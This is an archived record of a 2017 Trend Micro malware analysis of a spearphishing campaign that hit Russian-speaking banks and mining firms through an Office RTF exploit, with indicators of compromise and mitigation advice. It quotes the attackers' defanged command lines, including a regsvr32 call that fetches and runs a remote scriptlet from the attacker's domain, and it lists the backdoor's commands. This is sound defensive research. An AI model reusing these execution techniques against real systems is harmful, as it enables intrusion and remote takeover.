{
    "id": "6bb7602a-3dfb-4795-ba42-439b9c7246d9",
    "created_at": "2023-01-12T15:09:46.83356Z",
    "updated_at": "2025-03-27T02:05:35.55438Z",
    "deleted_at": null,
    "sha1_hash": "28e3c3833763d90e88adba2932631059f5b5c39c",
    "title": "2017-08-07 - Backdoor-carrying Emails Set Sights on Russian-speaking Businesses",
    "authors": "",
    "file_creation_date": "2022-05-27T21:29:35Z",
    "file_modification_date": "2022-05-27T21:29:35Z",
    "file_size": 175390,
    "plain_text": "# Emails with Backdoor Targets Russian Businesses\n\n**blog.trendmicro.com/trendlabs-security-intelligence/backdoor-carrying-emails-set-sights-on-russian-speaking-**\nbusinesses/\n\nAugust 7, 2017\n\nA malicious email campaign against Russian-speaking enterprises is employing a\ncombination of exploits and Windows components to deliver a new backdoor that allows\nattackers to take over the affected system. The attack abuses various legitimate Windows\ncomponents to run unauthorized scripts; this is meant to make detection and blocking more\nchallenging, particularly by whitelisting-based solutions.\n\nWe’ve observed at least five runs from June 23 to July 27, 2017, each of which sent several\nmalicious emails per target. Affected industries were financial institutions, including banks,\nand mining firms. Of note is how the attackers diversified their tactic—sending different\nemails for each run, per target.\n\nThe earliest sample of the malicious dynamic-link library (DLL) file related to these attacks\nwas uploaded to VirusTotal last June 6, 2017. This somewhat coincides with the spate of\nemails we saw during the period between the last week of June and July 27, 2017.\n\nWe're inclined to think that these attacks are still ongoing. Their limited distribution and\nspecificity in social engineering lures are red flags that may indicate they are a spearphishing campaign.\n\n_Figure 1. The malicious email campaign’s attack chain_\n\n\n-----\n\n_Figure 2. Different malicious emails sent to one target (timeline from left to right, clockwise)_\n\n_Figure 3: A sample email sent to a mining firm_\n\nThe infection chain starts with emails with addresses designed to make it look like they're\nfrom actual sales and billing departments. One sample we found used the subject\nline, Правила подключения к шлюзу, which translates to “Rules for connecting to the\n_gateway.” Another has the subject line, Оплата госпошлин, which means “Payment of_\n_state duties.”_\n\nThese emails contain an attachment that takes the form of a .DOC file with various file\nnames. Two of the file names we’ve seen used are Инструкция для подключения\n_клиентов.doc (Instructions for connecting clients) and Заявление на оплату услуги_\n_.doc (Application for payment of the service)._\n\n_Figure 4. Email with attached DOC file_\n\nThese files are actually a malformed Rich Text Format (RTF) file Trend Micro detects as\n[TROJ_EXPLOYT.JEJORC. These exploit a vulnerability (CVE-2017-0199) in Microsoft](http://blog.trendmicro.com/trendlabs-security-intelligence/april-patch-tuesday-microsoft-patches-office-vulnerability-used-zero-day-attacks/)\nOffice’s Windows Object Linking and Embedding (OLE) interface. We’ve actually seen other\nthreat actors leveraging this security flaw.\n\nThe exploit code downloads what is supposedly an XLS file from\n_hxxps://wecloud[.]biz/m11[.]xls. This domain, to which all of the URLs used by this attack_\npoint to, is controlled by the attacker and was registered in early July. This fake Excel\nspreadsheet file is embedded with malicious JavaScript. The Excel header will actually be\nignored and the file will be treated as an HTML Application file by mshta.exe, the Windows\ncomponent that handles/opens HTA or HTML files.\n\n_Figures 5 to 6. XLS file with header and JavaScript code_\n\n[The JavaScript in m11.xls contains two PowerShell scripts. The first script will download and](https://www.trendmicro.com/vinfo/us/security/news/security-technology/security-101-the-rise-of-fileless-threats-that-abuse-powershell)\nlaunch a decoy document, while the second will continue the infection chain by downloading\nanother file.\n\n_Figure 7. Decoy document from the first PowerShell script_\n\n_Figure 8. Content of newly downloaded file_\n\n\n-----\n\nThe file will be decrypted using AES-CBC cipher algorithm and then saved to\nthe %Appdata% folder with a random file name and .TXT extension. The decrypted file is a\ndynamic-link library (DLL) file detected as TROJ_DROPNAKJS.ZGEG-A.\n\n_Figure 9. Decrypted file_\n\nThe JavaScript code in m11.xls will then execute the file using the following command line:\nodbcconf.exe /S /A {REGSVR C:\\Users\\Administrator\\AppData\\Roaming\\{RANDOM}.txt}\n\nThis particular file (odbcconf.exe) is a normal executable that performs various tasks\n[associated with Microsoft Data Access Components. The command above misuses this](http://msdn2.microsoft.com/en-us/data/aa937729.aspx)\nfeature to execute the DLL file.\n\nUpon execution, this DLL will drop a file in the %AppData% folder. This file is appended with\na .txt extension. This is actually an SCT file (Windows scriptlet), which is normally used to\ndeclare variables, define expressions, and add functional codes in web pages. In this case, it\nhas a malicious, obfuscated JScript file (JS_NAKJS.ZIEG-A).\n\n_Figure 10. Dropped XML file showing obfuscated downloader code_\n\nThe DLL will execute the SCT file using the following command: regsvr32.exe /s /n /u\n/i:”C:\\Users\\Administrator\\AppData\\Roaming\\{RANDOM}.txt” scroBj.dll\n\nThis particular command uses the Regsvr32 (Microsoft Register Server) command-line utility,\nwhich is normally used to register and unregister OLE controls in the Windows registry,\n[including DLL files. This attack method is also known as Squiblydoo—Regsvr32 is abused to](http://www.theregister.co.uk/2016/04/29/squiblydoo/)\nbypass restrictions on running scripts. It also means evading application\nwhitelisting protections such as AppLocker. While [Squiblydoo is already a known attack](http://www.theregister.co.uk/2016/04/29/squiblydoo/)\nvector, this is the first time we’ve seen it combined with odbcconf.exe.\n\nThe above command, once deobfuscated, will execute another XML file, which is\ndownloaded from hxxps://wecloud[.]biz/mail/changelog[.]txt. This file serves as the main\nbackdoor.\n\n_Figure 11. Constructing the command to launch the final payload_\n\nThe same command format is used to launch the final payload (JS_GETFO.ZHEG-A). Note\nthat because of the /i switch, the code is directly gathered from a URL: regsvr32.exe /s /n /u\n/i: hxxps://wecloud[.]biz/mail/changelog[.]txt scroBj.dll\n\n\n-----\n\nThis is another SCT file with obfuscated JavaScript code that contains backdoor commands,\nwhich essentially allow attackers to take over an infected system. It attempts to connect to its\nC&C server at hxxps://wecloud[.]biz/mail/ajax[.]php and retrieve tasks to carry out, some of\nwhich are:\n\nd&exec = download and execute PE file\ngtfo = delete files/startup entries and terminate\nmore_eggs = download additional/new scripts\nmore_onion = run new script and terminate current script\nmore_power = run command shell commands\n\n**_Mitigation_**\n\nWhile the later stages of the infection chain required the use of various Windows\ncomponents, the entry point still involves the use of a Microsoft Office exploit. Patching and\nkeeping software up-to-date will protect users. Alternately, employing firewalls, intrusion\n[detection and prevention systems, virtual patching, and URL categorization, as well as](https://www.trendmicro.com/vinfo/us/security/news/virtualization-and-cloud/virtual-patching-in-mixed-environments-how-it-protects-you/)\nenforcing robust patch management policies, will significantly reduce the system’s attack\nsurface.\n\nApart from enforcing the principle of least privilege, system administrators should also\nconsider disabling system components that aren’t necessary to the user’s tasks. Another\noption is to blacklist possible command interpreters and rarely used applications, even if they\nare Windows components themselves. It should be noted that doing this could affect\nlegitimate system functions, but will improve security.\n\n**_Trend Micro Solutions_**\n\n[Trend Micro™ OfficeScan™ with](https://blog.trendmicro.com/en_us/business/products/user-protection/sps/endpoint.html) [XGen™ endpoint security has Vulnerability Protection that](http://www.trendmicro.com/us/business/xgen/index.html)\nshields endpoints from identified and unknown vulnerability exploits even before patches are\neven deployed. Trend Micro’s endpoint solutions such as Trend Micro™ Smart Protection\nSuites, and [Worry-Free™ Business Security protect end users and businesses from these](https://blog.trendmicro.com/en_us/small-business/worry-free-services-suites.html)\nthreats by detecting and blocking malicious files and all related malicious URLs.\n\n**_Indicators of Compromise (IoCs):_**\n\n_Related hashes detected as TROJ_EXPLOYT.JEJORC (SHA-256):_\n\n25c46c068dbee7bd77cf762ed140c80ddaf439d118f51080e92478f982848a30\n2d23b519931072632b8b6c0c9560d95414dd1639df895694dff7e5ea19fe5182\n\n_Related hash detected as TROJ_DROPNAKJS.ZGEG-A (SHA-256):_\n\n52d69c91fba8435398870d480f37e87f0a9f7ee721473c98659f5b94b1c91abb\n\n\n-----\n\n_Malicious DLLs detected as TROJ_DROPNAKJS.ZGEG-A (SHA-256):_\n\nff94ded03a42857c7c534229859b99e034745177184791df3084b6dde66b29e6\n0a424531b7c46a72a6f1e2b5a0449b487d30b2f5389a2b86720e278f07ae976b\n4e73334972d6b01650c572fd58596479e68edeb8337962a19e0a76579a9b4ecc\n81c400f0345b5b84fc484b4446b1b7fec5598083056c8012a308f8d38d44667e\n727e28c21462cdd3f28991305d16063c871c64674edae061f95e16c9f474fe13\ncb7f5dd7b0d6465a2d0b83042154f4329f6b7b2727c5ed17b95d777e43f437e1\n\n_URLs related to the malicious email campaign:_\n\nhxxps://mail[.]webmaster-1[.]kz/include/changelog[.]txt\nhxxps://getupdates[.]kz/ch582/changelog[.]txt\nhxxps://address-in[.]kz/client/changelog[.]txt\nhxxp://mail[.]maincdn[.]biz/s1/v111[.]xls\nhxxps://mail[.]maincdn[.]biz/info/changelog[.]txt\nhxxps://mail[.]maincdn[.]biz/s1/p11[.]db\n\nMalware\n\nA malicious email campaign against Russian-speaking enterprises is employing a\ncombination of exploits and Windows components to deliver a new backdoor that allows\nattackers to take over the affected system\n\nBy: Lenart Bermejo, Ronnie Giagone, Rubio Wu, Fyodor Yarochkin August 07, 2017 Read\ntime: ( words)\n\nContent added to Folio\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2017/2017-08-07 - Backdoor-carrying Emails Set Sights on Russian-speaking Businesses.pdf"
    ],
    "report_names": [
        "2017-08-07 - Backdoor-carrying Emails Set Sights on Russian-speaking Businesses.pdf"
    ],
    "threat_actors": [],
    "ts_created_at": 1673536186,
    "ts_updated_at": 1743041135,
    "ts_creation_date": 1653686975,
    "ts_modification_date": 1653686975,
    "files": {
        "pdf": "https://archive.orkl.eu/28e3c3833763d90e88adba2932631059f5b5c39c.pdf",
        "text": "https://archive.orkl.eu/28e3c3833763d90e88adba2932631059f5b5c39c.txt",
        "img": "https://archive.orkl.eu/28e3c3833763d90e88adba2932631059f5b5c39c.jpg"
    }
}